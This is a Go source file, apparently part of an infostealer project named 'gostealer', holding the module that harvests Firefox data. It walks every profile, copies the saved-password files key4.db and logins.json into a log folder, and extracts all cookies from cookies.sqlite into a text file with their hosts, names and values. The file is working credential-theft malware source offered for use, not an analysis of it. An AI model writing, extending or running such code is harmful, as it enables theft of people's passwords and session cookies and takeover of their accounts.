package browsers

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func Firefox(browserPath, logFolderPath string) {

	profiles, _ := os.ReadDir(browserPath)

	for _, profile := range profiles {
		getFirefoxPasswords(path.Join(browserPath, profile.Name()), logFolderPath)

		browserCookies := getFirefoxCookies(path.Join(browserPath, profile.Name()), logFolderPath)

		err := os.WriteFile(path.Join(logFolderPath, "Browsers", "Firefox", "Cookies.txt"), []byte(browserCookies), 0644)
		if err != nil {
			log.Println(err)
		}
	}

	//no wallets
}

func getFirefoxPasswords(browserPath, logFolderPath string) {
	files := []string{"key4.db", "logins.json"}

	for _, file := range files {

		if _, err := os.Stat(path.Join(browserPath, file)); !os.IsNotExist(err) {
			_, err := utils.CopyFile(path.Join(browserPath, file), path.Join(logFolderPath, "Browsers", "Firefox", file))
			if err != nil {
				log.Println(err)
				continue
			}
		}
	}
}

func getFirefoxCookies(browserPath, logFolderPath string) string {
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
	_, err := utils.CopyFile(path.Join(browserPath, "cookies.sqlite"), path.Join(logFolderPath, "raw", "firefox_cookies.sqlite"))
	if err != nil {
		log.Println(err)
		return ""
	}

	sqlitepath, err := sql.Open("sqlite", fmt.Sprintf("file:%s", path.Join(logFolderPath, "raw", "firefox_cookies.sqlite")))

	var data string

	if err != nil {
		log.Println(err)
		return ""
	}

	query, err := sqlitepath.Query("SELECT `host`, `path`, `expiry`, `name`, `value` FROM moz_cookies")

	if err != nil {
		log.Println(err)
		return ""
	}

	for query.Next() {
		cookie := CookieEntry{}
		err := query.Scan(&cookie.Host, &cookie.Path, &cookie.Expiry, &cookie.Name, &cookie.Value)
		if err != nil {
			log.Println(err)
			continue
		}

		data += fmt.Sprintf("Host: %s | Path: %s | Expiry: %d | Name: %s | Value: %s\n", cookie.Host, cookie.Path, cookie.Expiry, cookie.Name, cookie.Value)
		utils.CookieAmount++
	}

	return data
}
